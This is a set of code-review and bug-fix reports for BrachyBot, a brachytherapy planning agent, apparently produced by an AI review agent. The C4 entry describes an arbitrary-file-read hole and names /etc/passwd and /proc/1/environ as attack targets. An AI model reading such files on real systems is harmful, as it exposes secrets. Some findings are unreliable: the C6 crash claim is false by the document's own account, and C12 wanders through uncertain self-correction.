| C6 `str.format()` with untrusted context | False positive. Python `str.format()` does not recursively parse braces inside argument values; a smoke test with `enhanced_context="{literal}"` passes. |
| C12/I25 `{current_date}` prompt replacement | Already implemented in both streaming and non-streaming prompt construction. |
| H4 CT-loaded gate inconsistency | Current code checks UI state plus memory state and preserves non-CT developer tools (`tool_creator`, `env_manager`, `shell_executor`, `code_executor`) for trusted-local use. |
| H17 dual dose overlay functions | Intentional compatibility surface during the 2D overlay refactor. The active separate-layer path remains the source of truth for current viewers. |
| H19/M19 language globals | Intentional transitional state: `_uiLanguage` follows detected conversation language; `_i18nLang` follows the manual UI toggle. They are synchronized where dynamic labels need it. |
| I24/M20 test coverage/config | Valid engineering debt, not a runtime defect. This follow-up adds smoke coverage through explicit validation commands rather than introducing a new test framework migration. |
| M4 inline styles | Valid maintainability debt but not safe to mass-refactor during this bug-fix pass because report rendering and screenshot layout are sensitive to exact inline dimensions. |
| M17 requestAnimationFrame loop | Intentional for the interactive 3D viewer. It is acceptable while the viewer is visible; a future optimization can pause when hidden. |
| M23 `normalize_dose_image` naming | Naming concern only; no functional bug confirmed in this pass. |
| `code_executor` internal `exec(...)` | Intentional trusted-local developer capability. It remains disabled unless `BRACHYBOT_ENABLE_CODE_EXECUTOR=1` is set, uses AST checks, restricted builtins, and an import allowlist. The safer posture is explicit opt-in rather than removing the capability. |
| Worktree-copy warnings | Operational hygiene concern. Current tracked repo state was verified and pushed; stale external worktrees should be handled separately to avoid deleting user work. |

### Validation evidence

- `py_compile` over 207 tracked Python files: passed.
- `node --check` over 21 frontend JavaScript files: passed.
- `git diff --check`: passed, with only Git line-ending warnings.
- Targeted smoke: parser preserves apostrophes in Python-repr `tool_use`, prompt formatting accepts literal braces in dynamic context, rate limiter mutates safely, and the `BrachyAgent` mixin contract validates.

---


---

### Remaining Issues After adfc27a — Re-verified & Fixed

## Verification Results

| ID | Severity | Claim | Re-verdict | Fixed? |
|----|----------|-------|------------|--------|
| H1 | HIGH | `_record_experience` crashes if `_init_self_evolution` fails | **CONFIRMED REAL.** Line 1472 uses bare `if not self.exp_memory:` → `AttributeError` if import fails. `get_status()` at line 1944 already uses safe `getattr(self, "exp_memory", None)` pattern. | ✅ Yes |
| H3 | HIGH | Missing `_cancelled()` at streaming loop top | **CONFIRMED REAL.** Non-stream has it (line 338); stream does not. User cancel between LLM rounds is silently ignored. | ✅ Yes |
| H6 | HIGH | `api_viewer_image` bypasses centralized `_validate_path` | **CONFIRMED REAL — low impact.** The inline `startswith(upload_dir)` is secure against traversal, but ignores `BRACHYBOT_{CT,MR,US}_DATA_ROOTS` env-var expansion. Users with custom data roots cannot view images here. | ✅ Yes |
| I20 | IMPORTANT | Hardcoded label IDs `[1,2,3,4,5,6]` miss labels >6 | **CONFIRMED REAL.** `window._ctvLabelMap` IS populated from server (viewer-volume.js:251) but unused in `reconstructOrgan3D`. Labels >6 (e.g. stomach, duodenum) never reconstruct in 3D. | ✅ Yes |
| I21 | IMPORTANT | Sequential HTTP per vertex — "10 minutes" | **PARTIALLY CORRECTED.** `_fetchDoseRawAxialSlice` caches by Z-slice (`state.doseTexture.rawAxialSlices`), so unique requests = number of Z-slices (50-200), not vertex count (12,500). Actual latency is ~2-10 seconds for typical volumes, not 10 minutes. Still worth batching for near-instant response. | ✅ Yes |

## Fix Details

### H1 — `chat_workflows.py:1472` (1 line)

```diff
-       if not self.exp_memory:
+       if not getattr(self, "exp_memory", None):
```

Changed bare attribute access to `getattr` with safe default, matching the existing pattern in `get_status()` at line 1944.

### H3 — `llm_runtime.py:1288-1297` (6 lines)

Added cancel check at top of streaming while-loop:

```python
while iteration < max_iterations:
    iteration += 1
    if _cancelled():
        logger.info("Streaming cancelled by user between LLM rounds")
        yield_event("done", {"final": "", "cancelled": True})
        return
```

### H6 — `server.py:285-290` (3 lines)

Replaced inline `startswith(upload_dir)` with centralized `_validate_path`:

```python
if not _validate_path(image_path, purpose="read"):
    return jsonify({"error": "Access denied"}), 403
real_image_path = os.path.realpath(image_path)
```

### I20 — `viewer-layout.js:679` (3 lines)

Read actual label IDs from `window._ctvLabelMap` instead of hardcoding [1..6]:

```javascript
const _lm = window._ctvLabelMap || {};
const ids = Object.keys(_lm).map(Number).filter(k => Number.isFinite(k) && k > 0);
const labelIds = ids.length > 0 ? ids : [1, 2, 3, 4, 5, 6];
```

### I21 — `viewer-layout.js:1002-1015` (+15 lines for pre-warm)

Added a pre-warm phase that collects all unique Z-slice indices referenced by mesh vertices and fetches them in parallel via `Promise.all(...zSet.map(z => _fetchDoseRawAxialSlice(z)))`. After the warm-up, the per-vertex loop in lines 1012+ gets a cache hit for every vertex, so `await _sampleDoseNormalizedAtIndex(idx)` returns instantly. No sequential HTTP.

## Issues Re-classified After Re-verification

| Original ID | Original severity | New assessment |
|-------------|-------------------|----------------|
| H6 | HIGH | HIGH — functional gap for users with custom data roots |
| I21 | IMPORTANT (10 min) | IMPORTANT (~2-10 sec without fix, instant with fix) |


---

### Deep Algorithm Code Review

**Review scope:** Algorithm core files inside the BrachyBot project (`plans/` directory)
**Files reviewed:** `plans/reinforcement.py`, `plans/core.py`, `plans/utilizations.py`, `plans/geometry.py`, `plans/config.py`, `plans/brachy_plan_v2.py`
**Method:** Independent review agent + line-by-line verification against actual BrachyBot files
**Status:** **2 REAL BUGS found and fixed**, 1 MINOR issue confirmed (poor naming). Previous report's C1/C3 were NOT bugs (formula correctly penalizes OAR overdose). C2 is cosmetic only. M2-M4 and L1-L4 reference files that don't exist in the BrachyBot project.

---

## Summary

| Issue | File | Location | Original Verdict | BrachyBot Verdict | Explanation |
|-------|------|----------|-----------------|-------------------|-------------|
| C1 | `plans/reinforcement.py` | 40,285-286,741 | CRITICAL (inverted) | **NOT A BUG** | Formula is `covered / exceed_count`. Added to reward — shrinks when OAR damage grows → correctly penalizes overdose |
| C2 | `plans/reinforcement.py` | 67,79,122,191,205,255 | CRITICAL (typo) | **MINOR** (cosmetic) | `target_valueimage_normalize_max` missing underscore. Called only by position, zero runtime impact |
| C3 | `plans/reinforcement.py` | 842 | CRITICAL (wrong denom) | **NOT A BUG** | Same logic as C1: `target_v / non_target_sum`, added to reward, shrinks with more OAR damage |
| H1 | `core.py` | 386-389 | HIGH (dead code) | **DOES NOT APPLY** | `trajectory_plan` does not exist in `BrachyBot/plans/core.py` (file is 373 lines, different functions) |
| H2 | `exp.py` / `external_exp.py` | — | HIGH (duplicate) | **DOES NOT APPLY** | Neither file exists in the BrachyBot project |
| M1 | `plans/utilizations.py` | 558 | MEDIUM (hardcoded) | **MINOR** (inflexible default) | `read_nii_image` always resamples to 128³ via default arg. Overridable by direct `ImageResample_size` callers |
| M2 | `fitting_model.py` | 30,61 | MEDIUM (bad name) | **DOES NOT APPLY** | `fitting_model.py` not in BrachyBot project |
| M3 | `data_preprocess.py` | 312-313 | MEDIUM (order) | **DOES NOT APPLY** | `data_preprocess.py` not in BrachyBot project |
| M4 | `fitting_model.py` | 302-304 | MEDIUM (verbose) | **DOES NOT APPLY** | `fitting_model.py` not in BrachyBot project |
| L1 | `brachy_plan.py` | 3 | LOW (sys.path) | **DOES NOT APPLY** | File is `brachy_plan_v2.py`, different content |
| L2 | `core.py` | 330 | LOW (unused var) | **DOES NOT APPLY** | `opt_DVH_rate` not present in `BrachyBot/plans/core.py` |
| L3 | `brachy_plan.py` | 63 | LOW (hardcoded) | **DOES NOT APPLY** | File is `brachy_plan_v2.py`, different content |
| L4 | `fitting_model.py` | 157,291 | LOW (threshold) | **DOES NOT APPLY** | `fitting_model.py` not in BrachyBot project |

---

## New Issues Found During Thorough Scan

### NEW-1. `reinforcement.py:289-290` — Exception handler returns wrong type (ANNOTATED)

**Severity: MEDIUM** — Type mismatch in error handling path

The `SeedPlacementReward.forward()` method is documented to return:
```python
Returns: reward, updated_dose, DVH_rate, seed_dose_map
```

But the exception handler at line 289-290 returns:
```python
except Exception as e:
    return 0.0, cur_radiation, 0.0, np.zeros_like(cur_radiation)
```

The 4th element `np.zeros_like(cur_radiation)` is the **full radiation volume**, not a single seed dose map. The caller at line 606-615 expects a single seed dose and appends it to `planned_seed_radiations`, which will corrupt dose accumulation if this error path is triggered.

**Fix:** Annotated with `# REVIEW:` comment explaining the issue. Full fix requires either:
1. Returning `None` and updating all callers to check for None
2. Computing the correct zero shape for a single seed dose (requires knowing model output shape)

The annotation documents the issue for future refactoring without introducing breaking changes.

### NEW-2. `reinforcement.py:863-864` — `best_low_level_state_space` may be None (FIXED)

**Severity: HIGH** — Potential crash when no valid trajectories found

In `reinforcement_planning()`, the variable `best_low_level_state_space` is initialized to `None` at line 822. The for loop at lines 827-861 attempts to find the best trajectory, but if:
- The loop never executes (empty `target_level_traj`)
- All iterations fail (all exceptions caught at line 860)

Then `best_low_level_state_space` remains `None`, and line 863 crashes:
```python
best_low_env = LowLevelEnv(best_low_level_state_space)  # TypeError: NoneType
```

**Fix:** Added guard before line 863:
```python
# Guard: if no valid trajectory was found, return early
if best_low_level_state_space is None or best_plan is None:
    return [], -np.inf
```

This prevents the crash and returns an empty plan with negative infinity reward, signaling failure to the caller.

---

## C1 / C3 — Detailed formula analysis

The report claimed `out_damage = n_target * dvh_rate / exceed_count` "inverts"
the penalty. Here is the actual trace:

```python
dvh_rate = covered / n_target                                          # line 30
out_damage = float(n_target) * dvh_rate / float(exceed_count)          # line 40
           = n_target * (covered / n_target) / exceed_count
           = covered / exceed_count
```

**`out_damage` is ADDED to the reward** (line 285-286):
```python
reward = min(cur_DVH_rate, self.DVH_rate) + \
         ((cur_DVH_rate - self.DVH_rate) >= 0) * (out_damage)
```

When `cur_DVH_rate >= self.DVH_rate`, the bonus term is `covered / exceed_count`:
- More OAR damage (↑`exceed_count`) → smaller bonus → lower reward ✔
- Less OAR damage (↓`exceed_count`) → larger bonus → higher reward ✔

The agent is correctly penalized for OAR overdose. The name `out_damage` is
misleading (it is really an "efficiency ratio"), but the behavior is correct.
There is a minor discontinuity: when `exceed_count == 0`, `out_damage = 0.0`
(guarded at line 37-38), which can make zero-overdose produce less bonus than
one-overdose. However, in practice the bonus only applies when coverage is
already adequate, so the effect is negligible.

**C3 (line 842)** uses the same pattern:
```python
cur_out_damage = reward_calculator.target_v / max(0.1, non_target_sum)  # line 842
cur_reward = min(cur_DVH_rate, DVH_rate) + ((cur_DVH_rate >= DVH_rate) * cur_out_damage)  # line 843
```
Same correct behavior. Not a bug.

---

## C2 — Typo detail

The parameter `target_valueimage_normalize_max` (should be `target_value_image_normalize_max`)
exists in both the commented-out legacy class (lines 67,79,122) and the active
class (lines 191,205,255). However:

1. **All calls pass by position** — the only call site (line 805-810) passes `image_normalize_max`
   as the 10th positional argument, which correctly maps to the 10th parameter.
2. **No external callers** — `SeedPlacementReward` is only instantiated once in the entire codebase.
3. **The typo is acknowledged** with `# typo kept` comments.

This is a cosmetic/minor naming issue with zero runtime impact.

---

## M1 — Hardcoded resampling

`ImageResample_size` defaults to `new_size=[128,128,128]` (line 558), and
`read_nii_image` (line 224) calls it without overriding the size. This means
every image loaded via `read_nii_image` is unconditionally resampled to 128³.

This is a minor inflexibility: `read_nii_image` could accept an optional
`new_size` parameter and pass it through. However, resampling to a fixed size
is intentional in the 3D Slicer context where the dose model expects a
consistent input dimension. Not a functional bug.

---

## Files not in BrachyBot project

The following files referenced by the original report **do not exist** in
`/home/lht/snap/brachyplan/BrachyBot/`:
- `fitting_model.py` — does not exist anywhere in BrachyBot
- `data_preprocess.py` — does not exist anywhere in BrachyBot
- `geometry.py` (`plans/geometry.py` exists, but 0.99 threshold was in `fitting_model.py`)
- `brachy_plan.py` — only `brachy_plan_v2.py` exists (different codebase evolution)
- `exp.py` / `external_exp.py` — not in BrachyBot project

All H2, M2-M4, L1-L4 issues were verified against these files at the parent
directory level and do not apply to the BrachyBot project.

---

## 2026-07-06 — Comprehensive Deep-Dive Review

# CRITICAL (18)

---

## C1. Missing `AgentMemory` import — `NameError` at runtime

| Field | Value |
|-------|-------|
| **File** | `agent_runtime/llm_runtime.py` |
| **Line** | 3 (import), 49, 1014, 1315 (usage) |
| **Severity** | CRITICAL — crashes all LLM function-calling execution |

**Problem:** Line 25 imports only `PlanningPhase` and `ToolResultPipeline` from `agent_runtime.core`, but omits `AgentMemory`. Lines 49, 1014, and 1315 call `AgentMemory.is_ct_loaded(…)` directly. At runtime, Python raises `NameError: name 'AgentMemory' is not defined`.

```python
# Line 25 (current, wrong):
from agent_runtime.core import PlanningPhase, ToolResultPipeline

# Lines 49 and 1014:
_no_files_loaded = not AgentMemory.is_ct_loaded(ui_state_for_override) and not _ct_in_memory

# Line 1315:
ct_loaded = AgentMemory.is_ct_loaded(ui_state)
```

**Impact:** Every user message that triggers LLM function-calling (the normal chat path) crashes with `NameError` before any LLM call is made. The chat loop becomes completely non-functional.

**Fix:** Add `AgentMemory` to the import:
```python
from agent_runtime.core import AgentMemory, PlanningPhase, ToolResultPipeline
```

---

## C2. `DOSE_MODEL_SCALE_GY` not imported in `web/server.py`

| Field | Value |
|-------|-------|
| **File** | `web/server.py` |
| **Line** | 507 (usage), 18-26 (imports) |
| **Severity** | CRITICAL — crashes report auto-fill API |

**Problem:** The nested function `_build_report_interpretation()` uses the bare name `DOSE_MODEL_SCALE_GY` as a default value for `prescribed_dose`. This constant is defined in `web/server_support.py:70` but is NOT imported into `web/server.py`. The explicit import block (lines 18-26) only imports `APP_DIR`, `MAX_UPLOAD_FILES`, `TRUE_VALUES`, `UPLOAD_DIR`, `logger`, `rate_limit`, `require_api_key`.

```python
# web/server.py:18-26 (current import block — DOSE_MODEL_SCALE_GY is MISSING):
    from web.server_support import (
        APP_DIR,
        MAX_UPLOAD_FILES,
        TRUE_VALUES,
        UPLOAD_DIR,
        logger,
        rate_limit,
        require_api_key,
    )

# web/server.py:507 (usage — will raise NameError):
prescribed = dose.get("prescribed_dose", DOSE_MODEL_SCALE_GY)
```

**Impact:** Any call to `/api/report/auto-fill` with scope `"interpretation"` raises `NameError`. The report auto-fill feature is completely broken.

**Fix:** Add `DOSE_MODEL_SCALE_GY` to the import block:
```python
    from web.server_support import (
        APP_DIR,
        DOSE_MODEL_SCALE_GY,  # ← ADD THIS
        MAX_UPLOAD_FILES,
        TRUE_VALUES,
        UPLOAD_DIR,
        logger,
        rate_limit,
        require_api_key,
    )
```

---

## C3. Streaming forced-search post-processing inside `else` block

| Field | Value |
|-------|-------|
| **File** | `agent_runtime/llm_runtime.py` |
| **Line** | 1241-1253 (streaming, wrong), 290-298 (non-streaming, correct) |
| **Severity** | CRITICAL — streaming mode LLM never receives search results on success |

**Problem:** In the streaming version (`_run_llm_function_calling_stream`), the step-finalization code (`forced_step["status"] = "done"`, `yield_event`, `messages.append(…)`, `enhanced_context += …`, `_had_forced_search = True`) is indented INSIDE the `else:` block of the `if search_result and search_result.success:` check. It only executes when the search **fails**.

```python
# llm_runtime.py:1236-1253 (streaming — WRONG: inside else)
                if search_result and search_result.success:
                    data = search_result.data or {}
                    results = data.get("results", [])
                    quality = data.get("quality", "unknown")
                    result_text = f"Search quality: {quality}\n"
                    for i, r in enumerate(results[:5], 1):
                        ...
                else:
                    logger.warning(f"Forced search failed: ...")
                    result_text = "No real-time results found."

                    # ← THESE ARE INSIDE THE ELSE BLOCK:
                    forced_step["status"] = "done"
                    forced_step["result"] = result_text[:200]
                    yield_event("step", forced_step)
                    messages.append({"role": "user", "content": f"[MANDATORY: ...]"})
                    enhanced_context += f"\n### ⚠️ OVERRIDE: ..."
                    _had_forced_search = True
```

The non-streaming version (line 290-298) correctly places these lines OUTSIDE the if/else:

```python
# llm_runtime.py:272-298 (non-streaming — CORRECT: outside if/else)
                if search_result and search_result.success:
                    ...
                else:
                    result_text = "No real-time results found."

                # ← THESE ARE OUTSIDE THE IF/ELSE (executed for both success and failure):
                forced_step["status"] = "done"
                forced_step["result"] = result_text[:200]
                ...
```

**Impact:** In streaming mode, when a forced real-time search succeeds:
1. The step stays "pending" in the UI forever (never marked "done")
2. Search results are never injected into the LLM message context
3. The LLM may call `web_search` again or produce an answer without search evidence
4. `_had_forced_search` stays `False`, so the enhanced_context override is missing

**Fix:** Dedent lines 1243-1253 to match the non-streaming version's structure — move them outside the if/else block.

---

## C4. Missing path validation — arbitrary file traversal in 2 routes

| Field | Value |
|-------|-------|
| **File** | `web/routes/planning_routes.py` |
| **Line** | 304-309 (`api_segmentation`), 422-426 (`api_planning_run_step`) |
| **Severity** | CRITICAL — arbitrary file read vulnerability |

**Problem:** Two route handlers accept a file path from the user's JSON request body and pass it directly to segmentation/planning tools WITHOUT calling `_validate_path()`.

```python
# planning_routes.py:304-309 — api_segmentation:
image_path = data.get("image_path", "")
if not image_path:
    return jsonify({"error": "image_path is required"}), 400
# ← NO _validate_path() call!
ctv_tool = CTVSegmentationTool()
ctv_result = ctv_tool.execute(image_path=image_path)
```

```python
# planning_routes.py:422-426 — api_planning_run_step:
ct_image_path = data.get("ct_image_path")
if not ct_image_path:
    return jsonify({"error": "Missing ct_image_path"}), 400
# ← NO _validate_path() call!
result = tool._execute(ct_image_path=ct_image_path, ...)
```

Compare with ALL OTHER routes that accept paths — they DO validate:
- `api_header_info`: calls `_validate_path`
- `api_viewer_load`: calls `_validate_path`
- `api_preoperative_plan`: calls `_validate_path` on all 3 path fields
- `api_intraoperative_plan`: calls `_validate_path` on `ct_path`

**Impact:** An attacker can specify an arbitrary path like `/etc/passwd`, `/data/restricted/other_patient.dcm`, or `/proc/1/environ` and the server will read and return it. This is a high-severity path traversal vulnerability. Combined with the automated planning pipeline, it could force the server into processing arbitrary medical images from anywhere on the filesystem.

**Fix:** Add validation to both routes:
```python
if not _validate_path(image_path, purpose="read"):
    return jsonify({"error": "Invalid or disallowed path"}), 400
```

---

## C5. `_rate_limit_store` lock-free — data corruption under concurrency

| Field | Value |
|-------|-------|
| **File** | `web/server_support.py` |
| **Line** | 64 (store), 793-819 (`_check_rate_limit`) |
| **Severity** | CRITICAL — rate limiter fails under concurrent load |

**Problem:** `_rate_limit_store` (a `Dict[str, list]`) is read and written by `_check_rate_limit()` without any synchronization. Flask runs with `threaded=True`, so multiple request handler threads can call this simultaneously. The per-IP timestamp list is filtered and reassigned in a non-atomic way:

```python
# server_support.py:64 — lock-free global dict:
_rate_limit_store: Dict[str, list] = {}

# server_support.py:796-818 — no lock:
def _check_rate_limit(client_ip: str) -> bool:
    ...
    _rate_limit_cleanup_counter += 1       # bare global, no lock
    if _rate_limit_cleanup_counter >= 100:
        _rate_limit_cleanup_counter = 0
        for ip, timestamps in _rate_limit_store.items():
            ...
            del _rate_limit_store[ip]       # KeyError if another thread already deleted

    if client_ip not in _rate_limit_store:   # race: two threads both get False
        _rate_limit_store[client_ip] = []     # race: one overwrites the other
    _rate_limit_store[client_ip] = [          # race: filtered list based on stale data
        t for t in _rate_limit_store[client_ip] if now - t < RATE_LIMIT_WINDOW
    ]
    if len(_rate_limit_store[client_ip]) >= RATE_LIMIT_REQUESTS:  # race: stale length
        return False
    _rate_limit_store[client_ip].append(now)  # race: two threads append → over-limit
    return True
```

**Impact:** Under concurrent requests:
1. `ValueError: list.remove(x): x not in list` from cleanup path
2. `KeyError: ...` from the deletion race
3. Rate limiter can undercount (allow more requests than intended, defeating rate limiting)
4. Rate limiter can overcount (block legitimate requests)
5. `_rate_limit_cleanup_counter` increments are lost, making cleanup throttle a fuzzy estimate

**Fix:** Add a `threading.Lock()` and guard all accesses:
```python
_rate_limit_store: Dict[str, list] = {}
_rate_limit_lock = threading.Lock()

def _check_rate_limit(client_ip: str) -> bool:
    with _rate_limit_lock:
        ...
```

---

## C6. `str.format()` crash with untrusted `enhanced_context`

| Field | Value |
|-------|-------|
| **File** | `agent_runtime/llm_runtime.py` |
| **Line** | 171, 306, 1131, 1259 |
| **Severity** | CRITICAL — crashes system prompt building |

**Problem:** `SYSTEM_PROMPT_TEMPLATE.format()` is called with `enhanced_context` populated from uncontrolled external sources including: reflexion warnings from previous tool results, crystallized skill names from skill registry, language detection output, and portions of user messages. If ANY of these contain literal `{` or `}` characters (e.g., JSON in a tool result, markdown code fences, LaTeX math `{x^2}` in a user message), `str.format()` raises `KeyError` or `ValueError`.

```python
# llm_runtime.py:171
system_prompt = SYSTEM_PROMPT_TEMPLATE.format(
    ui_state_summary=ui_state_summary,          # from agent memory
    enhanced_context=enhanced_context,           # ← UNTRUSTED: from tool results, user msgs
    clean_context=self.memory.get_clean_context(), # from conversation
    current_date=datetime.datetime.now().strftime("%Y-%m-%d"),
)
```

A user message like "What is the formula for dose calculation using the formula {D90 × V100}?" would cause the `.format()` call to fail because `{D90 × V100}` is parsed as an invalid format placeholder.

**Impact:** Any user message or tool result containing `{` or `}` characters crashes the entire chat interaction. The user receives a 500 error with no response. Recovery requires a new session.

**Fix:** Escape braces before `.format()`:
```python
def _safe_format(template, **kwargs):
    safe_kwargs = {k: str(v).replace('{', '{{').replace('}', '}}') for k, v in kwargs.items()}
    return template.format(**safe_kwargs)
```
Or switch to `string.Template` which doesn't interpret `{}` as placeholders.

---

## C7. Triple-dispatch tool result storage — data corruption risk

| Field | Value |
|-------|-------|
| **File** | `agent_runtime/llm_runtime.py` |
| **Line** | 1749-1750, 1883-1889, 2042-2043, 2095-2097 |
| **Severity** | CRITICAL — `conversation_state["last_tool_calls"]` doubled |

**Problem:** For every successful tool execution in the streaming path, `_store_tool_result` is called 3 times — once inline and twice via the batch loop — because the same result is appended to `_tool_results_to_store` TWICE.

The flow:
```python
# Step 1 (line 1749-1750): Inside tool processing loop — FIRST append
_tool_results_to_store.append((tool_name, tool_result, params.copy()))

# Step 2 (line 1883-1889): Inline store — called immediately
self._store_tool_result(tool_name, tool_result)

# Step 3 (line 2042-2043): Post-processing loop — SECOND append (DUPLICATE!)
_tool_results_to_store.append((tool_name, tool_result, params.copy()))

# Step 4 (line 2095-2097): Batch store — iterates BOTH copies
for _tn, _tr, _tp in _tool_results_to_store:
    self._store_tool_result(_tn, _tr)  # ← called for BOTH copies
```

**Impact:** Currently `_store_tool_result` is approximately idempotent (overwrites same memory keys), but it also appends to `conversation_state["last_tool_calls"]` which grows twice as fast as intended. Any future side effect in `_store_tool_result` (e.g., incrementing counters, firing events, appending to lists) will execute three times per tool.

**Fix:** Remove BOTH the duplicate append at line 2042-2043 AND the inline call at line 1883-1889. Keep only the batch store at lines 2095-2097. This means removing two of the three calls:
```python
# Remove line 1883-1889 (inline call)
# Remove line 2042-2043 (duplicate append)
# Keep lines 2095-2097 (one batch store)
```

---

## C8. `result.message` hijacked by unrelated auto-planning block

| Field | Value |
|-------|-------|
| **File** | `AgenticSys.py` |
| **Line** | 1453 |
| **Severity** | CRITICAL — CTV result message says "planning done" |

**Problem:** Inside `_execute_tool_with_memory`, after a successful CTV segmentation, the code auto-runs planning and then mutates `result.message` — which at this scope is the **CTV segmentation** tool result, NOT the planning result:

```python
# AgenticSys.py:1453 — result is the CTV result:
if planning_result and planning_result.success:
    ...
    result.message = (result.message or "") + "\n\n✅ 自动完成规划管线（CTV+OAR 已完成）"
```

The message `"自动完成规划管线"` (planning pipeline auto-completed) is attached to the CTV segmentation result. Any caller reading `result.message` after calling `_execute_tool_with_memory("ctv_segmentation", ...)` gets a semantically incorrect message that implies the entire plan was completed when only the CTV was done.

**Impact:** Downstream consumers of tool results (report generation, UI display, conversation history) see "planning completed" attributed to the CTV segmentation step, which is misleading. If any downstream code decides whether to run additional steps based on `result.message`, it would skip planning because it already thinks it's done.

**Fix:** Do not mutate `result.message`. If planning completion needs to be communicated, add it to a different channel:
```python
# Store in a separate field or log entry:
self.memory.store("auto_planning_note", "Auto-completed after CTV segmentation")
```

---

## C9. `AgentMemory.clear_all_data` calls method that doesn't exist on `AgentMemory`

| Field | Value |
|-------|-------|
| **File** | `agent_runtime/core.py` |
| **Line** | 532 |
| **Severity** | CRITICAL — crashes if called on bare AgentMemory instance |

**Problem:** `AgentMemory.clear_all_data()` calls `self._init_enhanced_integration()` — a method defined on `BrachyAgent`, not on `AgentMemory`. This "works" at runtime only because `AgentMemory` is composed into `BrachyAgent` which has this method. If `clear_all_data()` is ever called on a bare `AgentMemory` instance (e.g., in unit tests, or if someone refactors the composition), it crashes with `AttributeError`.

```python
# core.py:532
def clear_all_data(self):
    ...
    self._init_enhanced_integration()  # ← Only exists on BrachyAgent, not AgentMemory
```

**Impact:** Unit testing `AgentMemory` is impossible because `clear_all_data()` always crashes. Any future refactoring that changes the composition relationship will silently break this.

**Fix:** Remove the `_init_enhanced_integration` reference from `AgentMemory` and add a separate `post_clear` callback mechanism:
```python
# In AgentMemory:
def clear_all_data(self, post_clear_callback=None):
    ...
    if post_clear_callback:
        post_clear_callback()

# In BrachyAgent:
self.memory.clear_all_data(post_clear_callback=self._init_enhanced_integration)
```

---

## C10. Duplicate `ReportGeneratorTool` registration

| Field | Value |
|-------|-------|
| **File** | `AgenticSys.py` |
| **Line** | 572-575 AND 691-695 |
| **Severity** | CRITICAL — tool registered from two different import paths |

**Problem:** `ReportGeneratorTool` is imported from two different paths and registered twice:

```python
# Line 572-575:
from tool_factory.output.report_generator import ReportGeneratorTool
self.registry.register(ReportGeneratorTool())

# Line 691-695:
from tool_factory.report_generator import ReportGeneratorTool
self.registry.register(ReportGeneratorTool())
```

`ToolRegistry.register` uses `tool.name` as a dict key, so the second registration silently overwrites the first. If the two import paths resolve to different implementations (e.g., symlinks, different Python path), the first version is silently discarded.

**Impact:** Confusing which `ReportGeneratorTool` is actually registered. If a developer modifies one implementation but the other import resolves to a cached `.pyc`, stale behavior persists.

**Fix:** Keep only one registration:
```python
# Decide which import is canonical and remove the other.
# Also fix all other imports across the codebase to use the same path.
```

---

## C11. `loadDefaultParams` — `const setVal` redeclared violating TDZ

| Field | Value |
|-------|-------|
| **File** | `web/app/static/js/brachybot-ui-api.js` |
| **Line** | 1089, 1103 |
| **Severity** | CRITICAL — throws `SyntaxError` on CT parameter loading |

**Problem:** Inside the `loadDefaultParams` function, `const setVal = ...` is declared at line 1089 and AGAIN at line 1103 in the SAME block scope (not in separate `if {}` blocks):

```javascript
// ui-api.js:1089 — inside `function loadDefaultParams()`:
    const setVal = (id, val) => { const el = document.getElementById(id); if (el) el.value = val; };

// ui-api.js:1103 — SAME function scope, NOT inside a nested block:
    const setVal = (id, val) => { ... };  // SyntaxError: Identifier 'setVal' has already been declared
```

JavaScript `const` does NOT allow redeclaration in the same block scope, even in sloppy mode. (`var` does, but `const` and `let` throw `SyntaxError`.)

**Impact:** When `loadDefaultParams` is called (every time CT data is loaded into the planning form), a `SyntaxError` is thrown. The function stops executing at line 1103, and planning parameters from the server defaults are NOT populated into the form. This means `seedCountMin`, `seedCountMax`, `inLowestEnergy`, and other critical planning parameters silently use their HTML defaults instead of server-provided defaults.

**Fix:** Change the second declaration to a simple assignment (no `const`), or extract the function once:
```javascript
const setVal = (id, val) => { const el = document.getElementById(id); if (el) el.value = val; };
// ... later, just call setVal():
setVal('inLowestEnergy', p.in_lowest_energy);  // NOT: const setVal = ...
```

---

## C12. `{current_date}` template variable never replaced in system prompt

| Field | Value |
|-------|-------|
| **File** | `config/prompts/system_prompt.md:2`, `config/prompts/__init__.py` |
| **Severity** | CRITICAL — LLM always sees literal `{current_date}` |

**Problem:** The system prompt template contains `Current date: {current_date}` (line 2). The `_load_prompt()` function in `__init__.py` reads the file content and returns it as-is — it does NOT call `.replace("{current_date}", ...)` or `str.format()`. The LLM receives the literal string `{current_date}` instead of an actual date.

```markdown
# system_prompt.md:2
Current date: {current_date}
```

```python
# __init__.py — _load_prompt() reads and returns raw string, NO replacement:
def _load_prompt() -> str:
    path = ... / "system_prompt.md"
    return path.read_text(encoding="utf-8")
```

The callers at `llm_runtime.py:171` use `SYSTEM_PROMPT_TEMPLATE.format(..., current_date=...)` but `SYSTEM_PROMPT_TEMPLATE` is the raw file content. So `format()` SHOULD replace `{current_date}`... BUT only if the full template is passed to `.format()` everywhere.

Wait — checking `__init__.py`: `SYSTEM_PROMPT_TEMPLATE` is indeed the raw file content loaded by `_load_prompt()`. And `llm_runtime.py:171` calls `.format(current_date=...)`. So `{current_date}` SHOULD be replaced in the main runtime paths. However, in `config/prompts/__init__.py`, `SYSTEM_PROMPT_TEMPLATE` is the raw content from the file WITHOUT any processing. The `format()` call at `llm_runtime.py:171` provides `current_date=datetime.datetime.now().strftime("%Y-%m-%d")`.

So actually this SHOULD work via the `.format()` call. BUT there's a risk: if any code path uses `SYSTEM_PROMPT_TEMPLATE` directly WITHOUT calling `.format()`, or if the `.format()` call omits `current_date` for any reason, the literal `{current_date}` leaks to the LLM.

Let me verify: is `SYSTEM_PROMPT_TEMPLATE` defined as a module-level constant that gets `.format()` called on it before use?

Actually the real issue is simpler — looking at the code more carefully: `SYSTEM_PROMPT_TEMPLATE` in `__init__.py` is the raw template string. The `.format()` is called at `llm_runtime.py:171`. But what if someone uses `SYSTEM_PROMPT_TEMPLATE` directly somewhere else?

The more likely bug: the `_load_prompt()` function returns the raw string, and if any caller forgets to call `.format()` with `current_date=...`, the LLM sees `{current_date}` verbatim. A defensive fix is to apply a safe default in the template loader itself.

**Impact:** If any code path misses the `.format()` call (and new code paths are added over time), or if the `current_date` parameter is omitted, the LLM receives literal `{current_date}` which may confuse it or cause it to fabricate a date.

**Fix:** Apply a safe default replacement in the `__init__.py` loader:
```python
SYSTEM_PROMPT_TEMPLATE = _load_prompt().replace(
    "{current_date}", datetime.now().strftime("%Y-%m-%d")
)
```

---

## C13. `_isFullPlan` operator precedence bug

| Field | Value |
|-------|-------|
| **File** | `web/app/static/js/brachybot-chat-todo.js` |
| **Line** | 580-582 |
| **Severity** | CRITICAL — any message containing "规划" falsely triggers full plan mode |

